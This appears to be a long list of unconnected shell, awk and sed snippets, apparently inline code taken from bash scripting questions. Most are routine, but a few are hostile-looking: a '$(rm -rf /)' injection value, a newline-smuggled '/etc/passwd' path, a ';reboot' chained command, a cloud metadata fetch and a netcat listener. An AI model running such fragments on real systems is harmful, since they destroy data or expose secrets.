gedit my_file_1.txt
gedit ls[0]
grep bar
call([ '/bin/bash', '-o', 'pipefail', '-c', command ])
NR==FNR{a[$2]=a[$2]==""?$3:a[$2] $3;next}
set -e
set -e
set -e
set +e
xterm*metaSendsEscape: true
xrdb ~/.Xdefaults
. ./set.sh
source ./set.sh
| grep -v "0 FDs"
| head -10
sudo -E env PATH=$PATH
shift $((OPTIND-1))
-logger org.apache.tools.ant.listener.AnsiColorLogger
echo $RANDOM
FNR==NR {a[$1]; next}
{if (FNR in a) print}
RS = "\n";
sort -R
lsb_release -a
line 57
bash my-script arg1 arg2
search thisandthat
printf "%.2x\n"
shell scripting
A + B
B + A
seq 4 | pairwise
echo "SELECT f_table_name FROM geometry_columns;" | spatialite -noheader -silent your_db.sqlite
>= or <=
tail -f
less the-big-log-file.log
/2021-11-21 19:00
/2021-11-23 23:00
|Mtee log-excerpt.txt
-DCUDA_NVCC_FLAGS="-I${mpi_path}/include -ccbin=$(which g++)"
... -DCUDA_NVCC_FLAGS="-I/opt/cray/mpt/6.2.1/gni/mpich2-cray/81/include -ccbin=/opt/gcc/4.8.2/bin/g++" ...
#! /usr/bin/env python
lst=(`ls $x`)
lst=( "$x"/* )
[ -d  ]
ls $x
[[ ... ]]
bash script.sh
sudo su
tput cols
eval $(resize)
tail -n +2
awk '{ print $1 }'
of group
man 5 proc
ps -t -x
grep -q
line=$(awk "NR==$i" in_parameters.txt)
line2= $line + ";" + $extr_out
exec > output.txt
-F :
!($2 in a)
pqR 2.15
R 3.0
man R
do loop
$$VERSION = 1.1.0
help set
ssh user@ip 'yourcommands ; listed ; etc.'
scp /your/scriptname user@ip:/tmp/
ssh user@ip 'sh /tmp/yourscriptname'
ssh user@ip 'sudo -s -- "yourcommands ; listed ; etc."'
install coreutils
brew install coreutils
variable = $(gdate --date="2010-10-02T09:35:58.203Z" +%s%N)
sed -i 's/b.\(STRING\).focus()/highlight("\1")/g' file
sed -i.bak
find ... > file
sed '...' $(find...)
mail -s
chmod +x /usr/local/sbin/chkfiles
grep -Hl
grep -Hno
grep -Hln
grep -Hn 'pattern' | cut -d " " -f 1
expr $(cat filename|sort|uniq|wc -l) - 1
cat filename|grep -v '^$'|wc -l
gapProg.c:(.text+0xa): undefined reference to ``G_PrintEO'
$nm libfirstgap.a
gnuplot < $file
set output $file.png
set output "$file.png"
log cmd "a b" c
set -x
sh dsl int atm 0/0/1 | inc Speed
IFS=: read -r _ _ _ groupid _
(( ))
phpunit .. && doStuff
grep  "P01" File
grep  " P01 " File
find . -name "*.p8" -o -name "*.p16" -o -name "*.p32
myvar=$(find . -name "*.p8" -o -name "*.p16" -o -name "*.p32")
date +%D
date +%D
sort -n
sort -h
sort -V
Note that -V is a gnu extension
help test
if [ $result -gt 0 ]
!! gs/do/dontdo/
fc -s do=dontdo
r do dontdo
echo $a
cd ./-12
cd -- -12
cd -- -12
rmdir -- -12
for file in $(command)
grep foo
grep -f foo
find my_dir/ -name "*filename*" | xargs grep 'lookingfor'
source test.sh; csh
<( ... )
shuf -i X-Y -nZ
xargs -nT
shuf -i 1-49 -n6
tr '\n' ' '
(( ++var ))
(( var += 1 ))
~/.bash_profile or ~/.bashrc
man grep
export -f
/usr/bin/env bash -c
rm test.swp
rm .test.swp
map <C-z> ;
column -t
sudo ./hid_listen
echo -en "\033c
wc -l
for image in *
-P 4
-n 1
-m 1
; exit
sed -i 's/old-word/new-word/g' *.txt
program -h
program --help
ls -lah
tr ';' "\n"
Minecraft (03)_206372.tga
rename 's/Minecraft \(03\)_//' *.tga
tail -f
tail --follow=name
localhost FALSE   /XSS/   FALSE   ******      loggedIn    No
-exec cd {} /;....
help wait
wait: wait [id]
time yourscript
GNU date
gnu date
< <(...)
read -a
java -jar
print xn
sed -i 's|'$fileWithPath'|HAHA|g' /home/${user}.sql
echo "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36" | sed 's/.*\(Mac\ OS\ X\ [0-9]\+_[0-9]\+_[0-9]\+\).*/\1/'
Mac OS X #_#_#
Mac OS X 10_9_1
sed 's/.*\(Chrome\/[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\).*/\1/'
int dot
bash scripting
linux api
RESULT=echo $LINE | sed "<something>"
stat -c %Y x;reboot
sed -i -e "s/#\"phpunit/phpunit:3.7.*\",/\"phpunit/phpunit:3.7.*\"," file.txt
OS X
for ((...;...;...))
( ...; ( ... ))
&; wait
bash -c 'time ./test1.sh' &> record_1
command1 && || command2
gnu awk
Solaris/SunOS system
bash -c "..."
" "
array=( ... )
date -d
unexpected end of file
-x -y
./skip-parts.sh -s AC
File “DRLAncillary_2014-01-15.tgz” exists
No such file “DRLAncillary_2014-01-25.tgz”.
grep: /opt/backup/st_backups.log: No such file or directory
command 2> >(grep "file" >&2
bash -n
echo $line | awk '{print $1}' | cut -d"-" -f2
[ $count -gt 0 ]; echo ...
[ $count -gt 0 ] || echo ... >&2
test "$count" = 0 && echo ... >&2
while read dom; do …; done < domain.list
$(cat domain.list)
git add -A && git commit -am 'initial commit'
cat -vet
cat $GEDIT_CURRENT_DOCUMENT_NAME
ssh -t <user>@<host> "tail -f /APP/logs/foo.log" | grep -oh "'[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]'" | php myscript.php <grep result>
ssh -t <user>@<host> "tail -f /APP/logs/foo.log" |grep "^javax.ejb.ObjectNotFoundException"  |awk '/[0-9]/ { system("php myscript.php  "$6) }'
tail -l #lines
cat my_dir/*/*/*.txt > all.txt
-exec ... {} +
$'foo \n/etc/passwd'
find -exec
shell("echo $0");
alias ls="ls --color=always"
ls -A
export HASHED=M0eSl8NR40wH
-e 's/([[:digit:]]+)/ \1 /g'
-e 's/^ *//g'
-e 's/ *$//g'
GNU sed
man bash
bash *./a.out*
bash *file_name*
#include <cstring>
tar cvzf - ./android_4.0.4_origen_final_full/ | split -b 2048m - android_4.0.4_origen_final_full.tar.gz
cat android_4.0.4_origen_final_full.tar.gz* | tar -zxvpf - -C /work
-b 2048m
f -
C /work
if ["$isframecount" -eq 0]
if [ "$isframecount" -eq 0 ]
ls /bin/[
$isframecount = 1
$isframecount = 1
Substring Replacement
shopt -s dotglob
shopt -s nullglob
[[ -e ... ]]
set folderNames to paragraphs of
do shell script
-mindepth $SUBDIRLEVEL -maxdepth $SUBDIRLEVEL
shopt -s nullglob;for f in ~/Pictures/loose\ files/*.jpg;do f2=${f##*/};d=~/Pictures/*/*/*/*/${f2%_*};[[ $d ]]&&echo mv "$f" $d;done
shopt -s nullglob
[[ $d ]]
[[ -n $d ]]
for f in ~/Pictures/loose\ files/*.jpg;do f2=${f##*/};d=$(find ~/Pictures -type d -name ${f2%_*});[[ $d ]]&&echo mv "$f" $d;done
chmod +x x.sh
echo -e
{print $0}
chmod +x bashor.sh
-f -
cat /tmp/out.log | sed 's/_[0-9_]*/$NUM/g' > /tmp/newout.log
grep "^ LOB" create_tables_clean.sql | grep "\"L_"
sudo apt-get purge linux-image-x.x.x.x-generic
bash -c
-iname '*py'
-iname '*py'
script.sh file.in
script.sh *.in
x.txt~ y.txt~
No such file or directory
rm -f
[[ and ]]
chmod +x
while IFS= read -r line; do ...; done < LONGFILE.dat
echo "$line"
cat example.txt
exit $?
cat example.txt
echo $[2*2]
echo $[2*2]
echo '$[2*2]'
cat -A
$2(File1) < $2(File2) <$3(File1)
BEGIN {print "Chromosome  Start   End Probes"}
NR==FNR{a[$1]=a[$1]==""?$2:a[$1] FS $2;next}
if (b[i]>$2&&b[i]<$3) c[$1]++
which sh
sudo -kS
print $1, $2
echo "mv $1 ${G_DEST_DIR}"
mv $1 ${G_DEST_DIR}
cat /proc/loadavg
rvm info
sudo rm -rf /usr/local/rvm
sudo rvm implode
13, 243
OS X Mountain Lion
OS X
OS X
shopt -s nullglob
[ -f "$f" ]
shopt -s extglob
sed 's/.00//'
... | sed 's/\..*//'
-o /dev/null
-w '%{http_code}'
seq 1234001 1234999
-o /dev/null
-w '%{http_code}'
break 2
first | last
printf %q
non-ASCII character
sed $'one_thing; another_thing' ac1.txt
/end/ {r exceptions\n}
/start/,/end/ {d}
echo -e "\n$CALC"
echo -e "\n$CALC"
wc -l
env $CALC
grep -q
/done/ {if (t>1) print name}
/^Name/ {name=$0}
/command/ {t=0}
INSERT xyz
$ perl the-script.pl some_file.txt > output.txt
sh run_jenkins.sh
sudo launchctl org.jenkins-ci.plist
print n[i]
ls -1 | wc -l
-type f
[...~1900 characters of...] comma, seperated, stuff [exceeding position 1900] followed by anything but expected seperator EOL
! [ ${myhash[$key]+abc} ]
[ ${myhash[$key]+abc} ] && echo $key
abc: command not found
${myhash[$key]+abc} && echo $key
[ ${array[key]+abc} ]
echo "exists"
read -a
regex = '^[0-9]+/[0-9]+/[0-9]+$'
LOAD DATA
[[ $line =~ $regex ]]
exit code
docker run [...] rvm
docker run [...] /bin/bash -l -c "rvm"
No such key: GroupMembership
No such key: GroupMembership
sh -xc "<script here>"
2nd - 5th
$1 = 0
$1 = 1
ls -1 /${TMP_DIR}/*0000000221*.dbf | xargs | sed 's/ /,/g'
for (i in a) if ($0~i) a[i]=a[i] FS $0}
END{for (i in a) print a[i]
ps -o %p%r%c -p$$
28/11/13 06:20:05
2013-11-28 06:20:05
$line = ...
-v sq=\'
grep -i "ab"
man grep
echo "get $remotepattern" | sftp "$remotehost"
echo $PATH
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)
printf %s
help echo
man echo
echo '' ${arrayN[@]}
cat <<<${arrayN[@]}
printf "%s\n" "${arrayN[*]}"
source /etc/bash.bashrc
bash /etc/profile
source /etc/bash.bashrc
alias killhttpserver=fuserfunction 80
chmod +x
chsh -s /path/to/your/bash root
source ~/.bashrc
echo $HISTCONTROL
shopt histappend
'myApp adhoc'
error: no provisioning profile matches ''myApp'
'myApp adhoc'
find -exec
Failed to frub the foo: frubber --foo=bar\ baz
source .bash-profile
--cookie "cookiename=cookievalue"
Developer Tools
tod=$(date +%F_%H%M%S)
perl --version
which perl
find / -name Ra.pm
source envfile
. envfile
perldoc perluniintro
Character Details
bash -c
bash -c
getconf FILESIZEBITS path
getconf /path
getconf FILESIZEBITS /mypath
df -T
ulimit -f
opt_mode = ENCRYPT
opt_mode = DECRYPT
alias cd='cd "$@" && pwd'
cd -
cd -
cd -P -
cd -L -
cd "$@"
sed -u 5q
head -n5
top -bn2 | awk '$1~/Cpu/ {print $6}' | sed -n '2p' | tr -d '%wa,'
top -bn2 | grep Cpu
man 1 zshmisc
man 1 bash
bla bla bla
This is ${name} ${surname}
This is
vi ...
diff -r -q
mount -t cifs -o username=user,password=pw //hostname/networkdir /mnt/localdir/
s/(BLA-[0-9]*)[ ]*//g
s/BLA-[0-9]*:[ ]*//g
s/BLA-[0-9]*[ ]*//g
dpkg, rpm, pacman
./test_package.sh: line 20: rpm: command not found
tail -f /var/log/msg | grep 'error' >> logfile
grep .
INDEX = 1122
export PRO"$INDEX"=/some/fancy/dirry
echo $"PRO$INDEX"
echo $PRO1122
qDebug() << system(". ./myExport.sh")
, (comma)
sudo chmod 777 <mvn location>
grep -qw
rm -rf
php -f invoke_manage_auto_requests_files.php create pre nrcc 15678 processing
PHP Version 4.4.4-8+etch6
PHP Version 4.3.9
sudo service reports start|stop|restart
--capture-output --enable-stdio-inheritance
web: gunicorn my_project.wsgi
Fri Feb 21 22:53:54 UTC 2014
version 3.0
~/myscript.sh -v
~/mysetenv.sh -g -version 3.0
-version 3.0
~/myscript.sh -c -v ver.3.0 --debug
. /development/scripts/setenv_script.sh # no options, ignoring that --debug from before
[ -f filename ]
[ str ]
[ -f $filename ]
[ -f ]
[ -f ]
2> /dev/null
line 1: [: too many arguments
/amtu/Utilities/amtu_daemon status
<<EOF bla bla EOF
dd if=/dev/zero bs=1M count=1024 | md5sum
367 MB/s
-n 1
read [-ers] [-u fd] [-t timeout] [-a aname] [-p prompt] [-n nchars] [-d delim] [name ...]
-t timeout: 
read -n 1 input & sleep 1 & wait
read -n 1 input && sleep 1
usleep 1000
sleep 1
apt-get update
white space
white space
for file in $(ls | egrep "^f\-.{$count}$");do
for file in $(ls | egrep "^f\-[0-9]{$count}$");do
kill -9 PID
A the cat went $a to the river Z and A goes to $a for Z
indirect variable
* * * * * php /path/to/phpfile.php >> /cronlog.txt
shell_exec("redis-cli ping");
sh: 1: redis-cli: not found
git diff /env_term.txt /env_cron.txt
sha 256
[ .. ]
if; then; fi
test <copy-1> = <copy-2> && echo a || echo b
|| echo b
command not found
verify_checksum file.tgz [SHA1, SHA256, MD5 checksum]
verify_checksum [SHA1, SHA256, MD5 checksum] file.tgz
verify_checksum file.tgz
verify_checkusm file1.tgz file2.tgz
shasum <file_to_check> | diff <checksum_file> -
grep -i <CHECKSUM>
curl -o
wget -O
/usr/local/bin/emacs --script hello.el
date -r 123439819723
Fri Aug 26 09:48:43 EST 5881
date --date
brew install coreutils
bash -c name_of_your_executable
digitemp_DS9097 -q -t 0 -O"%.2C"
grep -E
gnu awk
java -jar java-cup-11a.jar -parser  mj -dump src/mjparser/mj.cup >& javacup.dump
day=12, month=04, year=2014, hour=13, min=45
Read-thru and match
enable = 0
gnu awk
name = value
delete map
sed -n '...'
enable = 0
enable = 0
enable = 0
$ python SCRIPT.py
wc -l
b=$( curl ... | wc -l )
if (( a != b ))
man terminfo
help read
grep -q
return 0
return 1
{ ... ; } | ...
( ... ) | ...
<insert tool here>
find -exec
find -exec
/(open|filtered)/{print $2}
for loop
until nc 
; do ...; done
< /dev/null
git clone https://github.com/Study-Master/Java-WebSocket.git /tmp/socket && cd /tmp/socket && mvn install -Dmaven.test.skip=true
( command )
sleep 1
NOT FOUND
'My message [file:myfile.ext]'
tail -1
cut -f 1
ls -l | tr -s ' ' | cut -d ' ' -f <field number>
wc -c
sudo launchctl unload /Library/LaunchDaemons/org.jenkins-ci.plist
sudo launchctl load /Library/LaunchDaemons/org.jenkins-ci.plist
( ... )
stat -c %s "$file"
su - chidori -c "date;ls;df"
alias sw
ONLY_L="$(basename "$FILES")"
ONLY_L="$(echo "$FILES" | sed 's|.*/||')"
string substitution
ls -la
set -x
composer install
composer install
php artisan <command>
composer update
composer install
Main Display: Yes
print "$1\n"
say $1
#!/usr/bin/env node
#!/usr/bin/env nodejs
#do sth
grep "$line" file
grep "^$line"
bash -x yourscript.sh
bash -x
31      61      1800    1891    47      3983            88      1711    285
31  47  61  88 285 1711 1800 1891 3983
. 16  14  27  197  1426  89  91  2092
14     31      61      1800    1891    47      3983            88      1711    285
chmod +x
while read
grep -v ":0$"
wc -c
< |
VAR= ,
{ … }
column -t
$./test.sh aa bb cc
source my-env.sh
IFS== read key value
./script < filename
set -e
set +e
try { block A } catch { block B } finally { block C }
command exception
[[ $value == "$string" ]]
[[ $value != "$string" ]]
[[ $value != $pattern ]]
[[ $value == $pattern ]]
[[ $value =~ $regex ]]
[[ ! $value =~ $regex ]]
ls 4444kkkkk
GNU bash, version 3.2.57(1)-release (x86_64-apple-darwin17)
at queue
$(( ... ))
"buckle my shoe"
"a b"
"a b c"
-path ./misc -prune -o
grep -P (PCRE)
bind -p
bash -x
bind "R":"self-insert"
${str// +( )/}
compopt -o nospace
compopt -o filenames
grep -rnw . -e "text"
awk -F: '{print $1}'
$0 ~ tm
pew workon
man rev
reverse lines of a file or files
/ /
grep -P 'SEARCH TERM' fileName.txt | wc -l
cut <filename> -d" " -f3
sudo chef-client
echo $FOO
echo $FOO
unless ENV['PATH'].split(/:/).include?("/path/to/app/bin")
ls --full-time filename
while read
p and f
"[["( . , .)
declare -A
cmd="something-with $filename"
$(rm -rf /)
./example_args.sh --state IAM --user Yeezy -a Do --barg it
[ -f "$f" ] || continue
-maxdepth 1
(( and ))
10 < 2
1 != 01
2 -lt 10
1 -eq 01
gcc -lstdc++ main.cpp -o main.out
cat main.log
./main.out 2> >(sed "s/^/ERROR  : /g" >> main.log) > >(sed "s/^/SUCCESS: /g" >> main.log) ; cat main.log
[[ $Subdomain == n* ]] || [[ $Subdomain == N* ]]
[[ .. ]]
[[ $Subdomain == n* || $Subdomain == N* ]]
minicom -S hardcodedscript
$ echo $rvm_path
kareem dhcppc2 = /home/kareem/bin/backlight.sh
arr=("a b" c d)
echo "${arr[@]}"
disown -h
find -cmin 2
ps aux | grep <user>
ps aux | grep ?
main(String... args)
-f -
grep -v
Alt + /
complete -r thatcommand
getlast -1 -3
getlast -1 -2
<TD>Grand Total</TD>
mycript.sh -c test -s global -n /mydir/test1 -d /orgdir/test35
[ ... ]
some_fun "arg 1" "arg 2"
set -xv
sqlplus $user_pwd
> /dev/null 2>&1
connect $user_pwd
exit success
mvn clean install
mvn license:format notice:generate
git add .
git commit
git commit
my_expect_script "cd /home" "ls" "mkdir mydir"
filetype plugin indent on
automcd Filetype tex setlocal shiftwidth= etc
System Information
About this Mac
More Info
System Report
Location ID
echo "$DATE Ping: $PING" >> logs/ping.txt
echo "$DATE Ping: $PING"
df -h
df -h | awk '{print $4}'
test -z
$($LIST | ...)
output is hello
output is
echo "$a"
sudo ls -l
ls -l /Users/username/Library
sudo chmod 755 /Users/username/Library
[W1==W2 && S1==S2];
echo "${DESC[colindex]} ok";
echo "${DESC[colindex]} NG"
NO DESC ID TYPE ...
tail -n +2
tail +2
EXIT /B X
(exit 0)
env -i
file = Pathname.new "tmp-variables.txt"
top -o -cpu
shopt -s extglob
fdisk -l
liveusb-installer /dev/sdc
/path to the first partition/boot/liveusb-installer
mkfs.ext2 ${destUSB}2 -L casper-rw
mkfs.ext2 ${destUSB}2 -L home-rw
&> /dev/null &
rails server bgh
suffix aliases
rails server &> /dev/null &
&> /dev/null &
file.sh -b TEST
result is:
cut -f2 -d' ' t|sed 's_/[a-zA-Z0-9[:punct:]]*__g'
killall -SIGTERM vlc
var LOCAL_IP = ''
cut -d, -f1 file1 > tmp1
cut -d, -f1 file2 > tmp2
diff tmp1 tmp2
((cut -d, -f1 file1), (cut -d, -f1 file2)) > diff
sudo visudo
col -b
cat terminal_log.txt
col -b
col -b
render_control_chars $file
tput cuu 1; tput el
awk -v RS=" "
' a[$0]++ '
awk ' { $1=$2 } 1 '
<<< "${arr[@]} "
[[ $( ... )  ]]
GNU awk
bash: /usr/sbin/node: No such file or directory
sed -n
sh Setup.sh
bash --version
(( ))
{a[$1,$2]++; b[$1]; c[$2]}
END{for (i in b) {for (j in c) if (a[i,j]) print i,j,a[i,j]}}
'$1==prev {print FS $2 FS $3; next}
{prev=$1; print}'
cd "\"\$$#\""
eval cd "\"\$$#\""
"<TD>" with "<TH>"
"<TD>Grand Total" to "</TABLE>"
"<TD>Grand Total"
git branch -l | grep "FeatureA" …
umount /Volumes/<image name>
grep -c '^$find$' > count.txt
count="$(cat count.txt)"
man grep
A="bread" N=3 gretlcli -b -q f.inp
iostat -x
* * * * * /path/to/script
kill -kill
bind -P
bind '"\e[15~":"top\C-m"'
bindkey -s
foo bar
crontab -e
which mysqldump
crontab -e
crontab -e
1 1 * * * bash /scripts/file_name.sh
if grep foo.bar a.properties ; then echo found ; else echo not found; fi
cat a.properties | sed '/foo.bar/c\foo.bar = the new value'
tail -r
true if empty
[ "x$line" = x ]
test "x$line" = x
cat -b -s file |grep -v '^$'
01:00:00 - 03:00:00
git push
git config --global user.name "Your Name Here"
curl --help
python zombie.py &
kill -2
kill -2
kill -15
kill -9
p.daemon = True
p.daemon = True
curl http://domain.com/scripts/stuff.txt | grep foo
TCP socket
UNIX socket
--screen-top integer
--screen-left integer
--screen-width integer
--screen-height integer
alias vlc='/Applications/VLC.app/Contents/MacOS/VLC'
CTRl + C
Screencapture 2019-01-04 at 09.57.42.mp4
2>/dev/null > /dev/null
git rev-parse
git symbolic-ref
git symbolic-ref
docker run -i -t base /bin/bash
line 8: cd: example*//: file or directory does not exist
$'\r': command not found
while read -r line
-s file2.txt
while read -r line
grep -oP
grep -P
{ no matter what between }
' '
find $dir -maxdepth 1 -iname "*.log.*"
find $dir -maxdepth 1 -iname "*.log.*"
ls /opt/tibco/run/
whatever | grep -q required
grep -q
find . -name '*.c' OR '*.cpp' OR '*.cc'
\( \)
find . \( -iname bla -or -iname foo -or -name 'john dorian' \)
wrong syntax
-a -b
gnu awk
egrep -o
GNU grep
date --date=
YYYYYMMDD HH:MM:SS
cat domains
cat dom.txt
set -x
--posix -e
cat domains
cat result.txt
find . -type f -atime +5 | less
foo bar foo
[ foo ]
[ -n "$var" ]
find -type l -exec …
[ -e "$x" ]
man find
'CREATE' , 'TABLE' & ','
Record Separator
CREATE TABLE T1
is my TABLE but CREATE my TABLE T2
is table
print $NF
shopt -s extglob
find . -name "pattern"
mkdir -p
tr 'a-z' 'A-Z'
tr [a-z] [A-Z]
IGNORECASE = 1
set basePath to POSIX path of ((path to me as text)) & "Contents/Resources/Scripts/"
do shell script
{a[$1]; next}
$1 in a
BEGIN { FS="\n" }
new line
Record Separator
if [ $x == "valid" ]; then
if [ ""$x"" == "valid" ]; then
if [ "$x" == "valid" ]; then
echo ""a""
echo a
echo a b
echo a "" b
echo ""a
if [ "$x" = "some text" ]; then ...
if [ $x = "this is bad" ]; then ...
if [ ""$x"" = "this is bad" ]; then ...
x="a b"
echo "\""
echo \"
echo "a"
echo a
echo ""a""
echo a  b
echo "a  b"
ls -l | grep 2
folder1/  folder2/  folder3/
folder1/ folder2/ folder3/
-r, (.*)
Internal Field Separator
screen -x
Error: Unknown option x
: No such file or directory 2: cd: /ftb
screen -x
screen -x
sudo -l
sudo -l
sudo printenv PATH
man sudo
sudo -l
rails console
> ENV["GMAIL_USERNAME"] # => outputs nil
#!/usr/bin/env python
bash script.sh
uname -srvmo
uname -a
sudo su
redis-server & ; sidekiq ; kill $!
dftba SomeURL
-s SomeSource
error: argument --source/-s: expected one argument
error: too few arguments
error: too few arguments
args.source is None
xxx. ksh
service memcached start
/var/run/memcached/memcached(1 through 5).pid
/etc/init.d/memcached start
service memcached start
service memcached start
typeset -f
typeset -f myfn
declare -f foo
( ) *\\\n
s/( )? *\\ *$/\1/
( )?
s/\n *//g
tr '\n' '\r'
sed 's,\s*\\\s*, ,g'
tr '\r' '\n'
man bash
exec script -qfc "node server.js" server.log
echo $PS1
while read -r line
echo fib_table | sed 's/_$//'
mv arp-1/libtool
ln -sv /usr/bin/libtool
sudo apt-get install gcc && gcc --version
which libtool
which libtool
105 ~ 111
The positional parameters are temporarily replaced when a shell function is executed
for loop
24 27 13 34 2 104 645 411 1042 38 5 24 120 236 2 33 6
[ ${array[$i]} > $max ]
libfoo.so.1.2.3.4 -> libfoo.so.1.2.3.4.5
libfoo.so.1.2.3 -> libfoo.so.1.2.3.4
libfoo.so.1.2 -> libfoo.so.1.2.3
libfoo.so.1 -> libfoo.so.1.2
libfoo.so -> libfoo.so.1
libqux.so -> libqux.so.1
-x -y -z
IFS=/ x="${array[*]}"
echo "$x"
echo "$x"
echo $IFS
"dmg": ">= 0.0.0", "build-essential": ">= 0.0.0", "windows": ">= 0.0.0"
sed -n '/dependencies/, /}/ p' t|grep '.*='
if [ "$det" -eq "1" ];then
echo "'!b'"
echo "$(echo '$b')"
echo $(echo '!b')
set +H
set -H
echo $(echo '!b')
man bash
echo "$(echo '!b')"
echo "'!b'"
man tput
man terminfo
"&1" = "stop"
"$1" = "stop"
#!/usr/bin/env python
./some_script arg1 arg2 "multiple words arg3" arg4
"multiple words arg3"
od -c my_ID_file
dos2unix my_ID_file
man ldconfig
echo $Username
[139.797570.657062] 64 bytes from cache.google.com (143.215.192.243): icmp_seq=1 ttl=58 time=3.61 ms
\[ .. \]
wget http://169.254.169.254/latest/user-data
[ $answer -eq $no ]
"please enter correct input."
pkill instruments
bash ./script.sh
tar czf ...
git bash
find . -name '*indexscreen_*' -exec sh -c 'file={}; git mv $file ${file/"*indexscreen_*"/}' \;
find . -name '*indexscreen_*' -exec sh -c 'file={}; git mv $file ${file/"*indexscreen_*"/}; git commit -m "Renamed $file"' \;
find . -name '*indexscreen_*' -exec sh -c 'file={}; git mv $file ${file/indexscreen_/}' \;
cat somefile |
{ ... }
( ... )
grep -oP
echo "${Array[1]}"
grep -B
': '
chmod +x
Hello Holly.
echo "$f"
echo -n "$f "
file1 file2 file 3
$(find files/ -name 'data' -type f)
echo "after"
help return
return: return [n]
bash ./myscript.sh
chmod +x script.sh
tar --version
void square(int n)
square 5
ps aux | grep puma
Process.kill('TERM', pid)
mplayer -volume 100 Spice_Girls_Wannabe.mp3 < /dev/null &> /dev/null &
for line in sys.stdin
VARNAME=value cmd
echo ""
echo $foo
ls [abc]
tail my.log | python monitor.py
tail -f my.log | python monitor.py
tail -f my.log
tail -f my.log | grep error
echoScriptRunWay | cat
subprocess.call("./env.sh", shell = True)
import subprocess
export PATH=$PATH:~/bin
echo $PATH
env | grep PATH
curl --data "login=userid&pass=password" http://192.168.0.1:8090/httpclient.html
find . -type f -name '*.gz' | xargs zcat
ls -1s
gzip -l file(s)
gzip -l
echo ${#x[@]} = 6
= 3
cat /etc/hosts
sed -i -e "1i$IPADDR\\" -e "$1" /etc/hosts
echo -e "AA\nAABBAABBCC\nBBAABB" | grep --color=always "AABB\|"
$n = 31 + (++$m % 7)
echo -e "AA\nAABBAABBCC\nBBAABB" | awk 'BEGIN { c[0]="\x1b[1;31m"; c[1]="\x1b[1;34m"; n="\x1b[0m"} { i--; j=1; do { $0=gensub(/(AABB)/, c[i=(i+1)%2] "\\1" n, j++, temp=$0); } while ($0!=temp) print $0 }'
printf "FOOBARFOOFOOFOOBAR\nFOOBARFOOFOOFOOBARFOOFOOFOOFOOFOOFOOFOOFOOFOOFOOFOOFOO\n" | perl -ne 'BEGIN{sub c {"\033\[1;".(31+$_[0]%6)."m"} $d="\033\[0m";} s/(FOO)/c($i++).$1.$d/ge; print'
`cat input.txt`
man openssl
PASS PHRASE ARGUMENTS
-passout stdin
new_config ()
declare -g $2="${!3}"
declare -g
print NF > "/dev/stderr"
python --version
cat test.sh
bash test.sh
:set ff=unix
./script2.sh flename$i | string1 | string1
command1 | command2 | command...
grep -e
sort -nr
bash ./runFile.bash
bash runFile.bash
chmod +x
GNU awk
pkill -f
killall -r proc_*
pgrep -lf 'proc_.*'
typeset -i
declare -i
help command
ps -ef
rake secret
heroku run
heroku run 'rake secret > .secret'
heroku run bash
cmd | while read; do ..; done
while read; do ..; done <   <(cmd)
/^-----BEGIN PGP MESSAGE-----$/{store=1;txt="";}
/^-----END PGP MESSAGE-----$/{store=0;print tolower(txt)}
cat -n file
cat -n
cat -n
nl -b a "$file"
chmod 000
chmod 000
-L 12345:localhost:12345
nc -l -p 12345 | tar xzv
tar czv FileOrDir1 FileOrDir2 Etc | nc localhost 12345
chmod 711 ~
osascript -e 'set text item delimiters to linefeed' -e 'tell application "Contacts" to (value of email 1 of people) as text'
tr -d '[:lower:]'
tr -d 'a-z'
for h in {9..17};do for m in $(seq 0 5 55);do echo "<dict><key>Hour</key><integer>$h</integer><key>Minute</key><integer>$m</integer></dict>";done;done
crontab -e
EDITOR=nano crontab -e
bash -c
seq 10 | parallel " awk command > file{}.out "
seq 10 | parallel " awk command | tee file{}.out "
for f in $EXISTINGFILES
$(date -d @${epoch})
top -n 1 -b > dump1
sed & awk
start / Stop
CDH4 --
sort -R filename
echo "" > /tmp/mplayer.fifo
shuf file > randomshuffled
cat /etc/*release | awk {'print $1}'
mkdir $LOCALMOUNTPOINT
chmod +x ApexLauncher.apk
ls -1
man test
while read
set -- $x
shift <n>
shift 2
). This is a Reduce Regular Expression so be carefull with char like
(and should be escape by
set -f;
./runScript.bash 8000
exec python
exec python ...
echo "goodbye!"
/usr/bin/env python
import sys
ssh-keygen -t rsa
sh myscript.sh 1234
gcc $1 -o ${"$1":0:2} 'mysql_config --cflags --libs'
./compile: line 2: ${"$1":0:-2}: bad substitution
find ~ -type d -exec ls \;
ls -R
startaws dev
grep -n
ls /path/to/files/*pattern*.txt
A.rand B.rand C.rand
python shuffle.py --input_file File1 --seed 123
python shuffle.py --input_file File1 --seed 123
python shuffle.py --input_file File1 --seed 123
tr -d
bash [: missing
[ $FORCE=1 ]
| mail -s 'changed files' example@hifi.com
hello, hi
set -x
rrdtool xport
rrdtool fetch
sudo -u www-data my-bash-script
egrep --line-buffered
semitone -l
ant clean jar-withouthadoop -Dhadoopversion=23
pig -x local or pig
tr -s "[,'" "\n" | grep "^ip=" | cut -d "=" -f2
I want to store them in an array.
"tail -f"
YEAR="date +%Y"
date +%Y
date +%Y
grep -A
grep -B
grep -v
cat test.txt | grep -A10 test1 | grep -B10 test2
n > number of expected lines between test1 and test2
wc -l test.txt|cut -d" " -f1
wc -l test.txt|cut -d" " -f1
wc -l test.txt|cut -d" " -f1
grep "hello.*bye" filename
2nd,4th,6th etc
sleep 1
sleep 1
df -Pg
GB blocks
Mounted on
echo "123456789012345678901234567890"  | sed 's/./X/10'
echo "123456789012345678901234567890"  | sed 's/./X/10,20'
sed: -e expression #1, char 149: unknown command: '*'
print $2
echo $1
echo $1
$3 ~ /^00[1-7]$/
$3 > 0 && $3 <= 7
' '.join(words)
sh -c
command || othercommand
if ! command; then othercommand; fi
command; if [ $? -ne 0 ]; then othercommand; fi
CTRL+a c
screen -e ^jj
info screen
bash scriptName.sh
post views
mkdir -p
mail -s "Subject" emailaddress < file.tsv
echo "body" | uuencode inputattachment.tsv attachment.tsv) | mailx -s "subject" emailaddress
dscl . -create /Users/newuser UserShell /bin/sh
sudo su newuser
sudo su newuser
testa $a
foo ${a[@]}
cut -d/ -f4 <<<"$PWD"
sort -u
<---- File1
log () { ...; }
function name { ...; }
typeset var=value
git checkout $GIT_VERSION
grep -e
diff -r
if [ $userinput -eq $userinput.log  ];
[[ ... ]]
